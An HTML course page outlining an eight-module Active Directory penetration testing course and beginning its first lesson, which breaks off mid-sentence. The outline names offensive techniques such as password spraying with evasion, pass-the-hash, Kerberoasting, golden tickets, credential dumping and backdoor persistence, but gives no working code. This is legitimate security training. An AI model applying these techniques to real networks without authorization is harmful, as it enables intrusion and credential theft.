<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OSCP3</title>
    <link rel="stylesheet" href="../style.css">
</head>
<body>
    <div class="container">
        
        <p><a href="../index.html">‚Üê Back to Course Catalog</a></p>

        <!-- Header Area -->
        <div class="course-header">
             <span class="category-tag">Category Placeholder</span> <!-- Add category data if available -->
            <h1>OSCP3</h1>
            <p class="course-description">Description placeholder based on folder name</p> <!-- Add description data if available -->
            <div class="course-stats">
                <span><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-clock h-5 w-5 mr-2 text-primary"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> Duration Placeholder</span> <!-- Add duration data if available -->
                <span><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-layers h-5 w-5 mr-2 text-primary"><path d="m12 18-6-6-4 4 10 10 10-10-4-4-6 6"/><path d="m12 18v4"/><path d="m2 12 10 10"/><path d="M12 18 22 8"/><path d="M6 6 10 2l10 10"/></svg> 8 Modules</span>
                <span><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-zap h-5 w-5 mr-2 text-primary"><path d="M13 2v10h6l-7 10v-10H5z"/></svg> Difficulty Placeholder</span> <!-- Add difficulty data if available -->
            </div>
            <button>Start Learning</button>
        </div>

        <!-- Course Body: Tabs Navigation -->
        <!-- Added relative positioning to tabs-nav for potential dropdown positioning -->
        <div class="course-tabs-nav" style="position: relative;">
             <!-- Links use data attributes for JS handling and #hashes for history -->
             <a href="#overview" class="tab-link active" data-view="overview">Overview</a>
             <!-- Course Content tab now acts as a dropdown toggle -->
             <a href="#course-content" class="tab-link" data-view="course-content-toggle">Course Content</a>
             <a href="#discussion" class="tab-link disabled" data-view="discussion">Discussion (Static)</a>
        </div>
        <!-- The dropdown menu will be dynamically created and appended near the tabs nav -->


        <!-- Course Body: Content Area (Two-Column Layout) -->
        <!-- This grid structure is always present on course pages -->
        <div class="course-body-grid">
            <div class="main-content-column">
                 <!-- Content will be loaded here by JS -->
                 <!-- Initial content is Overview (handled by JS on load) -->
                 <!-- The 'card main-content-card' is now part of the fragment HTML itself -->
            </div>
            <div class="sidebar-column">
                 <!-- Sidebar content (only for overview) will be loaded here by JS -->
            </div>
        </div>

         <!-- Hidden container for content fragments and data -->
         <!-- Store fragments and raw data as JSON string for easier parsing in JS -->
        <script id="course-fragments" type="application/json">
        {
  "overview": "\n        <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n            <h2>About This Course</h2>\n            <div class=\"markdown-content\">\n                <p>Alright, buckle up! We&#39;re diving deep into Active Directory penetration testing. This course is designed to not just teach you <em>about</em> AD attacks, but to enable you to <em>understand</em> them so thoroughly that you can rebuild the tools and techniques yourself. Get ready to get your hands dirty!</p>\n<p><strong>Overall Course Objective:</strong> By the end of this course, learners will be able to conduct a comprehensive Active Directory penetration test, identify vulnerabilities, and create a functional clone of key AD attack tools and methodologies.</p>\n<p><strong>Course Prerequisites:</strong></p>\n<ul>\n<li>Basic understanding of networking concepts (TCP/IP, DNS, DHCP)</li>\n<li>Familiarity with Linux command line</li>\n<li>Basic knowledge of scripting (Python preferred, but PowerShell is a plus)</li>\n<li>Virtualization experience (VMware, VirtualBox)</li>\n<li>A willingness to break things (safely, in a lab environment!)</li>\n</ul>\n<hr>\n<p><strong>Module 1: Active Directory Foundations &amp; Lab Setup</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Understand the core concepts of Active Directory and set up a fully functional, isolated lab environment for safe and ethical penetration testing.</li>\n<li><strong>Subtopics:</strong><ul>\n<li>What is Active Directory? (Overview of purpose, history, and evolution)</li>\n<li>Key AD Components: Domains, Forests, Trees, Organizational Units (OUs)</li>\n<li>Domain Controllers: Roles, replication, and importance</li>\n<li>Trust Relationships: Understanding inter-domain communication</li>\n<li>Kerberos: The heart of AD authentication (brief overview, detailed analysis later)</li>\n<li>Windows Server: Installation, configuration, and basic management</li>\n<li>Windows Clients: Joining a domain, user profiles, and GPOs</li>\n<li>Lab Setup:<ul>\n<li>Virtualization environment setup (VMware/VirtualBox)</li>\n<li>Windows Server installation and configuration as a Domain Controller</li>\n<li>Windows Client installation and domain joining</li>\n<li>Network isolation and security considerations (importance of a closed network)</li>\n</ul>\n</li>\n<li>Basic PowerShell administration for AD.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Microsoft&#39;s official Active Directory documentation</li>\n<li>&quot;Active Directory Administration Cookbook&quot; (resource for server configuration)</li>\n<li>Basic virtualization tutorials for your chosen platform.</li>\n</ul>\n</li>\n<li><strong>Module Project:</strong>  Build your Active Directory lab.  Document the steps you took to install and configure the Domain Controller and Client machines. Include screenshots and justifications for your configuration choices. This will be a living document that you&#39;ll add to throughout the course.</li>\n</ul>\n<hr>\n<p><strong>Module 2: Active Directory Enumeration - The Reconnaissance Phase</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Learn and apply various techniques to gather information about the Active Directory environment, identifying potential targets and vulnerabilities.</li>\n<li><strong>Subtopics:</strong><ul>\n<li>The Importance of Enumeration: Why it&#39;s the foundation of a successful attack</li>\n<li>Basic Enumeration Techniques:<ul>\n<li><code>nslookup</code> and <code>dig</code> for DNS information gathering.</li>\n<li><code>ping</code> and <code>traceroute</code> for network discovery.</li>\n</ul>\n</li>\n<li>LDAP Enumeration:<ul>\n<li><code>ldapsearch</code>:  Understanding LDAP queries and syntax.  Searching for users, groups, computers, and OUs.</li>\n<li>LDAP filters:  Crafting complex queries to target specific information.</li>\n<li>Anonymous vs. Authenticated LDAP enumeration.</li>\n</ul>\n</li>\n<li>RPC Enumeration:<ul>\n<li><code>rpcclient</code>:  Exploring RPC services and shares.</li>\n<li>Identifying open ports and services.</li>\n<li>Gathering NetBIOS information.</li>\n</ul>\n</li>\n<li>PowerShell Enumeration:<ul>\n<li><code>Get-ADUser</code>, <code>Get-ADGroup</code>, <code>Get-ADComputer</code> cmdlets.</li>\n<li>Enumerating Group Policy Objects (GPOs).</li>\n<li>Discovering trust relationships.</li>\n</ul>\n</li>\n<li>Advanced Enumeration Tools:<ul>\n<li><code>Nmap</code> scripting engine (NSE) scripts for AD enumeration.</li>\n<li><code>Enum4Linux</code> for comprehensive enumeration.</li>\n</ul>\n</li>\n<li>Case Study: Analyzing real-world enumeration findings and their impact.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Understanding of LDAP protocol</li>\n<li>Familiarity with PowerShell scripting.</li>\n<li>Online resources for <code>ldapsearch</code>, <code>rpcclient</code>, <code>Nmap</code>, and <code>Enum4Linux</code>.</li>\n</ul>\n</li>\n<li><strong>Module Project:</strong> Using the tools and techniques learned, perform a comprehensive enumeration of your lab environment.  Document all findings, including user accounts, group memberships, computer names, network shares, and GPOs.  Prioritize potential targets based on your findings.  Start building your personal enumeration script (Python or PowerShell) that automates the enumeration process.</li>\n</ul>\n<hr>\n<p><strong>Module 3: Initial Access - Gaining a Foothold</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Learn and practice techniques to gain initial access to the Active Directory environment, simulating the first stage of a penetration test.</li>\n<li><strong>Subtopics:</strong><ul>\n<li>Understanding the Attack Surface: Identifying potential entry points.</li>\n<li>Assumed Compromise:  Starting from the perspective of a compromised workstation.</li>\n<li>Password Spraying:<ul>\n<li>Understanding password policies and common password patterns.</li>\n<li>Tools:  <code>Hydra</code>, <code>Medusa</code>, <code>Ncrack</code>, <code>CrackMapExec</code>.</li>\n<li>Avoiding account lockout.</li>\n<li>Detecting and mitigating password spraying attacks.</li>\n</ul>\n</li>\n<li>Credential Stuffing (brief overview): Utilizing leaked credentials.</li>\n<li>Exploiting Vulnerable Services (brief overview, more detailed in later modules):<ul>\n<li>Identifying vulnerable services using Nmap and other tools.</li>\n<li>Exploiting known vulnerabilities (e.g., EternalBlue, BlueKeep).</li>\n</ul>\n</li>\n<li>Case Study:  Analyzing real-world initial access scenarios and mitigation strategies.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Understanding of common password policies.</li>\n<li>Experience with password cracking tools like <code>Hydra</code> or <code>Medusa</code>.</li>\n<li>CVE databases and exploit repositories (e.g., Exploit-DB, Metasploit).</li>\n</ul>\n</li>\n<li><strong>Module Project:</strong>  Attempt to gain initial access to your lab environment using password spraying against valid user accounts. Document your attempts, successes, and failures.  Refine your enumeration script from Module 2 to automatically identify accounts with weak or default passwords.  Begin building a simple password spraying tool using Python or PowerShell, incorporating evasion techniques.</li>\n</ul>\n<hr>\n<p><strong>Module 4: Lateral Movement - Expanding Your Reach</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Learn and apply techniques to move laterally within the Active Directory environment, gaining access to more privileged accounts and systems.</li>\n<li><strong>Subtopics:</strong><ul>\n<li>Understanding Lateral Movement:  Why it&#39;s crucial for domain compromise.</li>\n<li>Pass-the-Hash (PtH):<ul>\n<li>Understanding NTLM hashes and their use in authentication.</li>\n<li>Tools: <code>Mimikatz</code>, <code>Impacket</code>, <code>Metasploit</code>.</li>\n<li>Mitigation strategies:  Disabling NTLM, using Protected Users group.</li>\n</ul>\n</li>\n<li>Pass-the-Ticket (PtT):<ul>\n<li>Understanding Kerberos tickets (TGTs and Service Tickets).</li>\n<li>Tools: <code>Mimikatz</code>, <code>Impacket</code>.</li>\n<li>Mitigation strategies:  Kerberos armoring, account monitoring.</li>\n</ul>\n</li>\n<li>Overpass-the-Hash (OtH): Bypassing NTLM restrictions with Kerberos.</li>\n<li>Impacket:  A powerful Python library for network protocols.<ul>\n<li><code>psexec.py</code>, <code>smbexec.py</code>, <code>wmiexec.py</code>:  Remote code execution techniques.</li>\n</ul>\n</li>\n<li>Psexec:  Using PsExec for remote code execution (understanding its limitations and alternatives).</li>\n<li>Windows Remote Management (WinRM):  Leveraging WinRM for lateral movement.</li>\n<li>Case Study:  Analyzing real-world lateral movement scenarios and detection methods.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Deep dive into NTLM and Kerberos authentication protocols.</li>\n<li>Familiarity with the <code>Impacket</code> library.</li>\n<li>Understanding of Windows services like SMB, WMI, and WinRM.</li>\n</ul>\n</li>\n<li><strong>Module Project:</strong>  Using a compromised user account in your lab environment, practice Pass-the-Hash and Pass-the-Ticket attacks to gain access to other systems. Implement <code>psexec.py</code> and other <code>Impacket</code> tools to execute commands remotely. Document your steps and the effectiveness of each technique. Add PtH and PtT functionality to your evolving attack tool.</li>\n</ul>\n<hr>\n<p><strong>Module 5: Domain Compromise - Taking Control</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Learn and apply techniques to achieve domain compromise, gaining full control of the Active Directory environment.</li>\n<li><strong>Subtopics:</strong><ul>\n<li>Understanding Domain Dominance:  The ultimate goal of an AD penetration test.</li>\n<li>Kerberoasting:<ul>\n<li>Understanding Service Principal Names (SPNs).</li>\n<li>Requesting and cracking Kerberos tickets for service accounts.</li>\n<li>Tools: <code>GetUserSPNs.py</code>, <code>Rubeus</code>, <code>Kerberoast.ps1</code>.</li>\n<li>Mitigation strategies:  Complex service account passwords, account monitoring.</li>\n</ul>\n</li>\n<li>AS-REP Roasting:<ul>\n<li>Identifying user accounts with the &quot;Do not require Kerberos preauthentication&quot; setting enabled.</li>\n<li>Requesting and cracking Kerberos tickets without preauthentication.</li>\n<li>Tools: <code>GetNPUsers.py</code>, <code>Rubeus</code>.</li>\n<li>Mitigation strategies:  Enforcing Kerberos preauthentication, account monitoring.</li>\n</ul>\n</li>\n<li>Delegation Attacks (Constrained and Unconstrained Delegation):  Exploiting misconfigured delegation settings.</li>\n<li>Golden Ticket Attacks:  Forging Kerberos Ticket Granting Tickets (TGTs) for persistent access.</li>\n<li>Silver Ticket Attacks:  Forging Kerberos service tickets to access specific services.</li>\n<li>Case Study:  Analyzing real-world domain compromise scenarios and their impact.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>In-depth understanding of Kerberos authentication and its vulnerabilities.</li>\n<li>Experience with Kerberos attack tools like <code>Rubeus</code> and <code>Impacket</code>.</li>\n<li>Knowledge of Active Directory delegation settings.</li>\n</ul>\n</li>\n<li><strong>Module Project:</strong>  In your lab environment, perform Kerberoasting and AS-REP Roasting attacks to obtain service account and user account credentials. Use these credentials to gain domain administrator privileges.  Implement a Golden Ticket attack for persistent access. Document your steps and the effectiveness of each technique.  Add Kerberoasting and AS-REP Roasting functionality to your attack tool.</li>\n</ul>\n<hr>\n<p><strong>Module 6: Advanced AD Exploitation with BloodHound</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Learn to use BloodHound for attack path mapping and identify complex attack vectors within the Active Directory environment.</li>\n<li><strong>Subtopics:</strong><ul>\n<li>Introduction to BloodHound:  A powerful Active Directory attack path mapping tool.</li>\n<li>BloodHound Data Collection:<ul>\n<li>SharpHound:  The BloodHound data collector.</li>\n<li>Data collection methods:  PowerShell, C#.</li>\n<li>Optimizing data collection for large environments.</li>\n</ul>\n</li>\n<li>BloodHound Analysis:<ul>\n<li>Understanding the BloodHound graph database.</li>\n<li>Identifying shortest paths to domain admin.</li>\n<li>Discovering hidden attack vectors.</li>\n<li>Analyzing group memberships, GPOs, and ACLs.</li>\n</ul>\n</li>\n<li>Domain Admin Escalation:<ul>\n<li>Exploiting identified attack paths to gain domain administrator privileges.</li>\n<li>Using BloodHound to identify vulnerable accounts and systems.</li>\n</ul>\n</li>\n<li>Advanced BloodHound Queries:<ul>\n<li>Custom queries for specific attack scenarios.</li>\n<li>Reporting and visualization of attack paths.</li>\n</ul>\n</li>\n<li>Case Study:  Analyzing real-world BloodHound findings and their impact on security.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Thorough understanding of Active Directory security principles.</li>\n<li>Familiarity with graph databases (Neo4j).</li>\n<li>Experience with PowerShell scripting.</li>\n</ul>\n</li>\n<li><strong>Module Project:</strong>  Install and configure BloodHound in your lab environment. Use SharpHound to collect data from your Active Directory domain. Analyze the data to identify the shortest path to domain admin.  Exploit the identified attack path to gain domain administrator privileges. Document your findings and the effectiveness of BloodHound in identifying complex attack vectors. Create a script that automates the BloodHound data collection process and highlights critical attack paths.</li>\n</ul>\n<hr>\n<p><strong>Module 7: Post-Exploitation in Active Directory - Maintaining Access &amp; Persistence</strong></p>\n<ul>\n<li><strong>Module Objective:</strong> Learn and apply techniques to maintain access and establish persistence within the compromised Active Directory environment.</li>\n<li><strong>Subtopics:</strong><ul>\n<li>Understanding Post-Exploitation:  Securing your foothold and maintaining control.</li>\n<li>Backdoors:<ul>\n<li>Creating user accounts with hidden privileges.</li>\n<li>Modifying GPOs to execute malicious code.</li>\n<li>Installing persistent backdoors on domain controllers.</li>\n<li>Using scheduled tasks for persistence.</li>\n</ul>\n</li>\n<li>Credential Dumping:<ul>\n<li><code>Mimikatz</code>:  Extracting credentials from memory.</li>\n<li><code>lsass.exe</code> process:  Understanding its importance and vulnerabilities.</li>\n<li>Protecting credentials from dumping:  Credential Guard, LSA Protection.</li>\n</ul>\n</li>\n<li>Netcat:  A versatile tool for network communication and backdoor creation.</li>\n<li>PowerShell Empire (brief overview):  A powerful post-exploitation framework.</li>\n<li>Defensive Evasion:<ul>\n<li>Avoiding detection by antivirus and intrusion detection systems.</li>\n<li>Obfuscating code and payloads.</li>\n</ul>\n</li>\n<li>Case Study:  Analyzing real-world post-exploitation scenarios and detection methods.</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Deep understanding of Windows security mechanisms.</li>\n<li>Experience with <code>Mimikatz</code> and other credential dumping tools.</li>\n<li>Familiarity with PowerShell scripting and defensive evasion techniques.</li>\n</ul>\n</li>\n<li><strong>Module Project:</strong>  In your compromised lab environment, implement multiple backdoors to maintain persistent access. Use <code>Mimikatz</code> to dump credentials from memory.  Implement defensive evasion techniques to avoid detection by security tools. Document your steps and the effectiveness of each technique.  Create a script that automates the creation and deployment of backdoors.</li>\n</ul>\n<hr>\n<p><strong>Module 8: AD Attack Documentation &amp; Capstone Project: Attack Tool Cloning</strong></p>\n<ul>\n<li><strong>Module Objective:</strong>  Document the entire penetration testing process, communicate findings effectively, and consolidate learned skills by creating a functional clone of a key AD attack tool.</li>\n<li><strong>Subtopics:</strong><ul>\n<li>The Importance of Documentation:  Communicating findings and providing actionable recommendations.</li>\n<li>Documenting the AD Penetration Testing Process:<ul>\n<li>Detailed steps for user enumeration, lateral movement, and domain compromise.</li>\n<li>Screenshots and code snippets to illustrate key findings.</li>\n<li>Vulnerability assessment and risk analysis.</li>\n</ul>\n</li>\n<li>Report Writing:<ul>\n<li>Creating a clear and concise penetration testing report.</li>\n<li>Executive summary, technical findings, and recommendations.</li>\n<li>Prioritizing vulnerabilities based on impact and likelihood.</li>\n</ul>\n</li>\n<li>Remediation Strategies:<ul>\n<li>Providing actionable recommendations to mitigate identified vulnerabilities.</li>\n<li>Implementing security best practices.</li>\n</ul>\n</li>\n<li><strong>Capstone Project</strong>: Choose one of the key attack tools/techniques covered in the course (e.g., Kerberoasting, AS-REP Roasting, Password Spraying, PtH/PtT) and create a functional clone using Python or PowerShell.  This clone should:<ul>\n<li>Implement the core functionality of the chosen attack.</li>\n<li>Include command-line options for customization.</li>\n<li>Generate detailed output and logs.</li>\n<li>Demonstrate a clear understanding of the underlying principles.</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><strong>Suggested Resources/Prerequisites:</strong><ul>\n<li>Review of all previous modules.</li>\n<li>Penetration testing report templates.</li>\n<li>Security best practices for Active Directory.</li>\n</ul>\n</li>\n<li><strong>Module Project:</strong><ol>\n<li><strong>Complete Documentation:</strong> Document all steps taken during the penetration test of your lab environment, from initial enumeration to domain compromise. Include detailed descriptions of the vulnerabilities exploited and the impact of each attack.  Provide actionable recommendations for remediation.</li>\n<li><strong>Capstone Project:</strong> Develop your chosen attack tool clone.  Document the design, implementation, and testing of your tool.  Demonstrate its functionality in your lab environment.  Present your documentation and tool to the class (if applicable) or to a designated reviewer.</li>\n</ol>\n</li>\n</ul>\n<hr>\n<p>This course outline provides a comprehensive framework for learning Active Directory penetration testing. Remember to adapt the content and projects to your specific needs and learning style. Good luck, and happy hacking (ethically, of course)!</p>\n\n            </div>\n            <h2 class=\"module-list-heading\">Course Content</h2> <!-- Add heading for module list -->\n            <ul class=\"module-list\">\n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-1\" data-view=\"module-1\" data-module-order=\"1\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 1: 1: Active Directory Foundations & Lab Setup</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">1: Active Directory Foundations & Lab Setup Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-2\" data-view=\"module-2\" data-module-order=\"2\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 2: module_2</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_2 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-3\" data-view=\"module-3\" data-module-order=\"3\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 3: module_3</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_3 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-4\" data-view=\"module-4\" data-module-order=\"4\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 4: module_4</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_4 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-5\" data-view=\"module-5\" data-module-order=\"5\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 5: module_5</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_5 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-6\" data-view=\"module-6\" data-module-order=\"6\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 6: module_6</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_6 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-7\" data-view=\"module-7\" data-module-order=\"7\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 7: module_7</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_7 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        \n        <li class=\"module-item\">\n            <!-- Link uses data attributes for JS handling -->\n            <a href=\"#module-8\" data-view=\"module-8\" data-module-order=\"8\">\n                <div class=\"card module-card\">\n                    <div class=\"module-card-content\">\n                        <div class=\"module-title-area\">\n                           <h3>Module 8: module_8</h3>\n                           <!-- Add description if available -->\n                           <!-- <p class=\"module-description\">module_8 Overview</p> -->\n                        </div>\n                        <div class=\"module-meta\">\n                            <span class=\"module-duration\">30min</span>\n                            <svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-lock h-5 w-5 text-gray-500\"><rect width=\"18\" height=\"11\" x=\"3\" y=\"11\" rx=\"2\" ry=\"2\"/><path d=\"M7 11V7a5 5 0 0 1 10 0v4\"/></svg> <!-- Lock Icon -->\n                        </div>\n                    </div>\n                </div>\n            </a>\n        </li>\n        </ul> <!-- Include the module list for Overview -->\n        </div>\n    ",
  "modules": {
    "module-1": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 1: 1: Active Directory Foundations & Lab Setup</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p><strong>Module Objective:</strong> Understand the core concepts of Active Directory and set up a fully functional, isolated lab environment for safe and ethical penetration testing.</p>\n<p><strong>Subtopics:</strong></p>\n<ul>\n<li>What is Active Directory? (Overview of purpose, history, and evolution)</li>\n<li>Key AD Components: Domains, Forests, Trees, Organizational Units (OUs)</li>\n<li>Domain Controllers: Roles, replication, and importance</li>\n<li>Trust Relationships: Understanding inter-domain communication</li>\n<li>Kerberos: The heart of AD authentication (brief overview, detailed analysis later)</li>\n<li>Windows Server: Installation, configuration, and basic management</li>\n<li>Windows Clients: Joining a domain, user profiles, and GPOs</li>\n<li>Lab Setup:<ul>\n<li>Virtualization environment setup (VMware/VirtualBox)</li>\n<li>Windows Server installation and configuration as a Domain Controller</li>\n<li>Windows Client installation and domain joining</li>\n<li>Network isolation and security considerations (importance of a closed network)</li>\n</ul>\n</li>\n<li>Basic PowerShell administration for AD.</li>\n</ul>\n<p><strong>Suggested Resources/Prerequisites:</strong></p>\n<ul>\n<li>Microsoft&#39;s official Active Directory documentation</li>\n<li>&quot;Active Directory Administration Cookbook&quot; (resource for server configuration)</li>\n<li>Basic virtualization tutorials for your chosen platform.</li>\n</ul>\n<p><strong>Module Project:</strong> Build your Active Directory lab. Document the steps you took to install and configure the Domain Controller and Client machines. Include screenshots and justifications for your configuration choices. This will be a living document that you&#39;ll add to throughout the course.</p>\n<hr>\n<h3>1.1 What is Active Directory?</h3>\n<p>Active Directory (AD) is Microsoft&#39;s directory service implementation for Windows domain networks.  Think of it as a centralized database that manages users, computers, groups, and other objects within a network.  It&#39;s the backbone of many enterprise IT infrastructures, providing:</p>\n<ul>\n<li><strong>Centralized Authentication:</strong>  Users authenticate once to the domain, rather than needing separate logins for each resource.</li>\n<li><strong>Centralized Authorization:</strong>  AD controls access to network resources based on user identity and group membership.</li>\n<li><strong>Centralized Management:</strong>  Administrators can manage users, computers, and security policies from a single location.</li>\n<li><strong>Policy Enforcement:</strong> Group Policy Objects (GPOs) allow administrators to enforce security settings and configurations across the network.</li>\n</ul>\n<p><strong>History and Evolution:</strong></p>\n<p>AD was introduced with Windows 2000 Server and has evolved significantly since then.  Early versions focused primarily on user and computer management.  Later versions added features like:</p>\n<ul>\n<li><strong>Group Policy:</strong>  Enabling centralized configuration management.</li>\n<li><strong>Active Directory Federation Services (ADFS):</strong>  Supporting single sign-on (SSO) across different organizations.</li>\n<li><strong>Active Directory Certificate Services (AD CS):</strong>  